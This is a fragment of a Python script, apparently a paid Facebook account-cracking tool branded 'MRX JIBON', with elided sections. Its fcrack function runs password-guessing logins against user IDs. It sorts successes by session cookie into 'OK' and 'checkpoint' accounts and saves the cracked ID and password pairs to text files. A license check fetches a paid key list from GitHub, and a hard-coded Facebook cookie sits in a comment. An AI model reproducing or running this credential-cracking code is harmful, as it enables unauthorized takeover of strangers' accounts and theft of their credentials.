...
logo = """
\033[1;31m      __  ___                 ___ __   
\033[1;32m     /  |/  /_____  __       / (_) /_  ____  ____    
\033[1;33m   / /|_/ / ___/ |/_/  __  / / / __ \/ __ \/ __ \   
\033[1;34m  / /  / / /  _>  <   / /_/ / / /_/ / /_/ / / / /   
\033[1;35m /_/  /_/_/  /_/|_|   \____/_/_.___/\____/_/ /_/    
 \033[1;36m                                 
--------------------------------------------------
[•] OWNER      : \x1b[38;5;208mMRX JIBON
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=0zCdY_D5U5IZS0TIZgbh2DR_; sb=0zCdY7TTnD21zZamIQzBV0e5; fr=0eMRXy6Me9FGYlGbbO.AWUAB87RO6QrK0sZi1xH5beAY3Q.Bj1q6p.CL.AAA.0.0.BkD2G0.AWX3C9ktkUA; locale=en_US',
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MRX-OK] '+cid+' | '+ps+'\x1b[1;97m')
                open('MRX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;33m[MRX-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('MRX-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mADDICTOR-MRX\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Mrx-Jibon/Jibon-Paid/blob/main/Jibon-Paid.txt').text
    if id in httpCaht:
